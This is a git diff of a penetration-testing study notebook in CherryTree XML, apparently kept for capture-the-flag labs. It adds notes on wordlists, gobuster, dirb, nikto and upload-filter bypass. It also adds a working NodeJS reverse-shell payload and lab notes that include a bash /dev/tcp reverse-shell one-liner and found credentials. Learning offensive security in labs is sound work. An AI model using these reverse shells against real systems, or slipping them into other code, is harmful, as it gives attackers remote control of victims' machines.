@@ -8,7 +8,7 @@
 
 
 </rich_text>
-    <node name="Linux Basics" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1698759322" ts_lastsave="1698759935">
+    <node name="Linux Basics" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1698759322" ts_lastsave="1699287038">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 list in tree view
 </rich_text>
@@ -53,6 +53,9 @@ Kali:
       <rich_text>
 </rich_text>
       <rich_text indent="1">apt install -y kali-linux-default</rich_text>
+      <rich_text>
+
+alternative to cat -&gt; less</rich_text>
       <node name="User Management" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1695158810" ts_lastsave="1698768153">
         <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 New user:
@@ -202,20 +205,21 @@ Search directories:
 
 </rich_text>
       </node>
-      <node name="Wordlist" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1695159329" ts_lastsave="1698762168">
-        <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    </node>
+    <node name="Wordlist" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1695159329" ts_lastsave="1699274173">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Seclists:
 git clone </rich_text>
-        <rich_text link="webs https://github.com/danielmiessler/SecLists.git">https://github.com/danielmiessler/SecLists.git</rich_text>
-        <rich_text>
+      <rich_text link="webs https://github.com/danielmiessler/SecLists.git">https://github.com/danielmiessler/SecLists.git</rich_text>
+      <rich_text>
 apt-get install seclists
 
 /usr/share/seclists</rich_text>
-        <rich_text indent="1">
+      <rich_text indent="1">
 </rich_text>
-        <rich_text>
+      <rich_text>
 </rich_text>
-        <rich_text indent="1">├── Discovery
+      <rich_text indent="1">├── Discovery
 ├── Fuzzing
 ├── IOCs
 ├── Miscellaneous
@@ -224,26 +228,25 @@ apt-get install seclists
 ├── Payloads
 ├── Usernames
 └── Web-Shells</rich_text>
-        <rich_text>
+      <rich_text>
 
 Subdomains:
 </rich_text>
-        <rich_text indent="1">/usr/share/seclists/Discovery/DNS/subdomains</rich_text>
-        <rich_text>
+      <rich_text indent="1">/usr/share/seclists/Discovery/DNS/subdomains</rich_text>
+      <rich_text>
 
 Directory :
 </rich_text>
-        <rich_text indent="1">/usr/share/seclists/Discovery/Web-Content/directory-list</rich_text>
-        <rich_text>
+      <rich_text indent="1">/usr/share/seclists/Discovery/Web-Content/directory-list</rich_text>
+      <rich_text>
 
 Passwords:
 </rich_text>
-        <rich_text indent="1">/usr/share/wordlists/rockyou.txt</rich_text>
-        <rich_text>
+      <rich_text indent="1">/usr/share/wordlists/rockyou.txt</rich_text>
+      <rich_text>
 
 
 </rich_text>
-      </node>
     </node>
     <node name="Python" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1697983062" ts_lastsave="1698759370">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -1622,13 +1625,27 @@ Flags:
       <rich_text>
 
 Use "gobuster [command] --help" for more information about a command.</rich_text>
-      <node name="Commands" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="#ffffff" ts_creation="1695160129" ts_lastsave="1695474506">
+      <node name="Commands" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="#ffffff" ts_creation="1695160129" ts_lastsave="1699275963">
         <rich_text>Standard directory enumeration:
 </rich_text>
         <rich_text indent="1">gobuster dir --url http://</rich_text>
         <rich_text indent="1" weight="heavy">IP</rich_text>
         <rich_text indent="1">/ -w </rich_text>
         <rich_text indent="1" weight="heavy">WORDLIST</rich_text>
+        <rich_text>
+
+Enumerate files with specific extensions in a directory:
+</rich_text>
+        <rich_text indent="1">gobuster dir --url </rich_text>
+        <rich_text>http://</rich_text>
+        <rich_text weight="heavy">IP</rich_text>
+        <rich_text>/ -w </rich_text>
+        <rich_text weight="heavy">WORDLIST</rich_text>
+        <rich_text> -x </rich_text>
+        <rich_text weight="heavy">EXTENSION</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text indent="8">jpg,php,...</rich_text>
         <rich_text>
 
 Standard subdomain enumeratrion
@@ -1639,7 +1656,7 @@ Standard subdomain enumeratrion
         <rich_text> -u http://DOMAIN/ --append-domain </rich_text>
       </node>
     </node>
-    <node name="Dirbuster" unique_id="17" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695160372" ts_lastsave="1697102274">
+    <node name="Dirbuster" unique_id="17" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695160372" ts_lastsave="1699285224">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 DIRB(1)                                                          General Commands Manual                                                          DIRB(1)
 
@@ -1709,6 +1726,11 @@ The Dark Raver                                                          27/01/20
         <rich_text indent="1">/ </rich_text>
         <rich_text weight="heavy">/WORDLIST</rich_text>
       </node>
+    </node>
+    <node name="Nikto" unique_id="83" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699285224" ts_lastsave="1699285256">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+nikto -h </rich_text>
+      <rich_text weight="heavy">IP</rich_text>
     </node>
   </node>
   <node name="Services" unique_id="67" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697104557" ts_lastsave="1697104564">
@@ -2338,7 +2360,7 @@ UNION ALL SELECT </rich_text>
 
 </rich_text>
     </node>
-    <node name="Payloads" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1698932657" ts_lastsave="1699013311">
+    <node name="Payloads" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1698932657" ts_lastsave="1699283070">
       <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
       <rich_text>
 list msfvenom payloads:
@@ -2413,6 +2435,26 @@ PHP reverse-shell:
       <rich_text indent="2">$port = </rich_text>
       <rich_text indent="2" weight="heavy">1234</rich_text>
       <rich_text indent="2">;       // CHANGE THIS</rich_text>
+      <rich_text>
+
+NodeJS reverse-shell:
+</rich_text>
+      <rich_text indent="1">(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(</rich_text>
+      <rich_text indent="1" weight="heavy">PORT</rich_text>
+      <rich_text indent="1">, "</rich_text>
+      <rich_text indent="1" weight="heavy">IP</rich_text>
+      <rich_text indent="1">", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();</rich_text>
     </node>
     <node name="XSS" unique_id="78" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698764744" ts_lastsave="1698765116">
       <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
@@ -2456,7 +2498,7 @@ changing query parameter values</rich_text>
       </node>
     </node>
   </node>
-  <node name="Burp" unique_id="68" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697138374" ts_lastsave="1697141883">
+  <node name="Burp" unique_id="68" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697138374" ts_lastsave="1699287281">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
 
@@ -2508,14 +2550,112 @@ go to proxy setting
 adjust interception rule to include scope only</rich_text>
     </node>
   </node>
-  <node name="Notes" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1696093389" ts_lastsave="1699013591">
-    <rich_text>http://java.uploadvulns.thm/
+  <node name="AAO" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699287281" ts_lastsave="1699287298">
+    <rich_text>Check available command:
+</rich_text>
+    <rich_text indent="1">sudo -l</rich_text>
+  </node>
+  <node name="Web Exploitation basic method" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="31" is_bold="0" foreground="" ts_creation="1699272931" ts_lastsave="1699274102">
+    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
+    <rich_text>
+UPLOAD EXPLOITATION:
+</rich_text>
+    <rich_text indent="1">RECON</rich_text>
+    <rich_text>:
+</rich_text>
+    <rich_text indent="2">Identitfy languages and frameworks.</rich_text>
+    <rich_text indent="1">
+</rich_text>
+    <rich_text indent="3">Use Wappalyzer / analyze responses (server, x-powered-by, ..).</rich_text>
+    <rich_text indent="1">
+</rich_text>
+    <rich_text indent="2">Enumerate directories.</rich_text>
+    <rich_text indent="1">
+</rich_text>
+    <rich_text indent="2">Identify upload page.</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">Upload legitimate file.</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">Find the page containing the uploads.</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="3">Gobuster -x switch -&gt; used to look for files with specific extensions.</rich_text>
+    <rich_text indent="2">
+</rich_text>
+    <rich_text indent="3">For example: -x php,txt,html-&gt; the tool would append .php, .txt, and .html to each word in the selected wordlist</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">CLIENT-SIDE FILTER BYPASS:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">Analyze source code for client-side scripts for client-side filters</rich_text>
+    <rich_text>.
+</rich_text>
+    <rich_text indent="2">Malicious file upload, bypassing any client-side filters</rich_text>
+    <rich_text>.</rich_text>
+    <rich_text indent="1">
+</rich_text>
+    <rich_text indent="2">Analyze error message</rich_text>
+    <rich_text>.
+</rich_text>
+    <rich_text indent="1">CLIENT-SIDE FILTER BYPASS:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">Successfull upload legitimate file with invalid file extension (e.g. testingimage.invalidfileextension)?
+</rich_text>
+    <rich_text indent="3">Yes -&gt; possibly extension blacklisting.</rich_text>
+    <rich_text indent="2">
+</rich_text>
+    <rich_text indent="3">No -&gt; possibly extension whitelisting.</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">Upload legitimate file with the magic number of the file to be something that you would expect to be filtered
+</rich_text>
+    <rich_text indent="3">Fail -&gt; Magic number based filtering.</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">Upload legitimate file with the MIME type of the upload changed to something that you would expect to be filtered.
+</rich_text>
+    <rich_text indent="3">Fail -&gt; </rich_text>
+    <rich_text>filtering based on MIME types.
+</rich_text>
+    <rich_text indent="2">Enumerate file length filters with the legitimate file. </rich_text>
+  </node>
+  <node name="Notes" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1696093389" ts_lastsave="1699286992">
+    <rich_text>10.10.176.118
 
-/images
+10.10.114.163
+
+Apache/2.4.18
+
+Username: R1ckRul3s
+pass: Wubbalubbadubdub
+
+gobuster dir --url http://10.10.114.163/ -w
+dirb http://10.10.114.163/
+nikto -h 10.10.114.163
+
+
+http://10.10.114.163/
+assets/
+server-status/
+robots.txt -&gt; Wubbalubbadubdub
+login.php
+
+bash -i &gt;&amp; /dev/tcp/10.10.176.118/1234 0&gt;&amp;1
+
+/Sup3rS3cretPickl3Ingred.txt
 /assets
+/clue.txt
+/denied.php
+/portal.php
 
-gobuster dir --url </rich_text>
-    <rich_text link="webs http://java.uploadvulns.thm/">http://java.uploadvulns.thm/</rich_text>
-    <rich_text> -w </rich_text>
+users:
+ubuntu
+rick
+
+second ingredients</rich_text>
   </node>
 </cherrytree>
